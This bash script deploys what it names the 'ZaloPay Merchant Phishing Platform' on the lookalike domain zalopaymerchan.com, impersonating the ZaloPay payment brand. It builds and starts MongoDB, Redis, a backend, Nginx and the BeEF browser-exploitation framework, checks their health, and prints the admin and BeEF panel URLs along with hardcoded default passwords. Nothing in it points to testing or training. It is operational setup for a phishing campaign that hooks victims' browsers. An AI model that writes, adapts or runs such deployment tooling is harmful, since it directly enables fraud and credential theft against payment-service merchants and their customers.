#!/bin/bash
# ZaloPay Merchant Phishing Platform - Docker Deployment Script
# Domain: zalopaymerchan.com

set -e

echo "🐳 Starting ZaloPay Merchant Phishing Platform Docker Deployment..."
echo "📅 $(date)"
echo "=================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if Docker is running
print_status "Checking Docker installation..."
if ! docker info > /dev/null 2>&1; then
    print_error "Docker is not running. Please start Docker service first."
    exit 1
fi
print_success "Docker is running"

# Check if Docker Compose is available
if ! command -v docker-compose > /dev/null 2>&1; then
    print_error "Docker Compose is not installed."
    exit 1
fi
print_success "Docker Compose is available"

# Create necessary directories
print_status "Creating necessary directories..."
mkdir -p ssl/{live,archive,renewal}
mkdir -p logs
print_success "Directories created"

# Generate MongoDB keyfile for replica set
print_status "Generating MongoDB keyfile..."
if [ ! -f mongodb-keyfile ]; then
    openssl rand -base64 756 > mongodb-keyfile
    chmod 600 mongodb-keyfile
    print_success "MongoDB keyfile generated"
else
    print_warning "MongoDB keyfile already exists"
fi

# Set proper permissions
print_status "Setting proper permissions..."
sudo chmod -R 755 scripts/ || true
print_success "Permissions set"

# Load environment variables
print_status "Loading environment configuration..."
if [ -f .env.docker ]; then
    source .env.docker
    print_success "Environment configuration loaded"
else
    print_warning "Using default environment configuration"
fi

# Stop any existing containers
print_status "Stopping existing containers..."
docker-compose down || true
print_success "Existing containers stopped"

# Build custom images
print_status "Building custom Docker images..."
docker-compose build --no-cache
print_success "Custom images built"

# Start MongoDB first to ensure it's ready
print_status "Starting MongoDB..."
docker-compose up -d mongodb
print_success "MongoDB started"

# Wait for MongoDB to be ready
print_status "Waiting for MongoDB to be ready..."
sleep 30

# Initialize MongoDB replica set
print_status "Initializing MongoDB replica set..."
docker exec zalopay-mongodb mongosh --eval "
rs.initiate({
  _id: 'rs0',
  members: [{ _id: 0, host: 'mongodb:27017' }]
})"
print_success "MongoDB replica set initialized"

# Start remaining services
print_status "Starting all services..."
docker-compose up -d
print_success "All services started"

# Wait for services to be healthy
print_status "Waiting for services to be healthy..."
sleep 60

# Run health checks
print_status "Running health checks..."

# Check MongoDB
if docker exec zalopay-mongodb mongosh --eval "db.adminCommand('ping')" > /dev/null 2>&1; then
    print_success "MongoDB is healthy"
else
    print_error "MongoDB health check failed"
fi

# Check Redis
if docker exec zalopay-redis redis-cli ping | grep -q PONG; then
    print_success "Redis is healthy"
else
    print_error "Redis health check failed"
fi

# Check Backend API
if curl -f -s http://127.0.0.1:8000/health > /dev/null; then
    print_success "Backend API is healthy"
else
    print_warning "Backend API health check failed - may need more time to start"
fi

# Check BeEF
if curl -f -s http://127.0.0.1:3000/api/hooks > /dev/null; then
    print_success "BeEF is healthy"
else
    print_warning "BeEF health check failed - may need more time to start"
fi

# Check Nginx
if curl -f -s -k http://127.0.0.1/health > /dev/null; then
    print_success "Nginx is healthy"
else
    print_warning "Nginx health check failed"
fi

# Display service status
print_status "Service status:"
docker-compose ps

# Display resource usage
print_status "Resource usage:"
docker stats --no-stream

print_success "Docker deployment completed successfully!"
echo "=================================================="
echo "🎉 ZaloPay Merchant Phishing Platform is now running in Docker!"
echo ""
echo "🌐 Main Website: https://zalopaymerchan.com"
echo "🔧 Admin Panel: https://zalopaymerchan.com/admin"
echo "🐄 BeEF Panel: http://zalopaymerchan.com/beef/ui/panel"
echo "📊 API Health: http://zalopaymerchan.com/health"
echo ""
echo "🔑 Default Admin Credentials:"
echo "   Username: admin"
echo "   Password: Admin@ZaloPay2025!"
echo ""
echo "🔑 BeEF Credentials:"
echo "   Username: beef"
echo "   Password: ZaloPay_BeEF_2025_Secure!"
echo ""
echo "🐳 Docker Management:"
echo "   View logs: docker-compose logs [service-name]"
echo "   Stop all: docker-compose down"
echo "   Restart: docker-compose restart"
echo "   View status: docker-compose ps"
echo ""
echo "📊 Monitoring:"
echo "   Container stats: docker stats"
echo "   System resources: docker system df"
echo "=================================================="
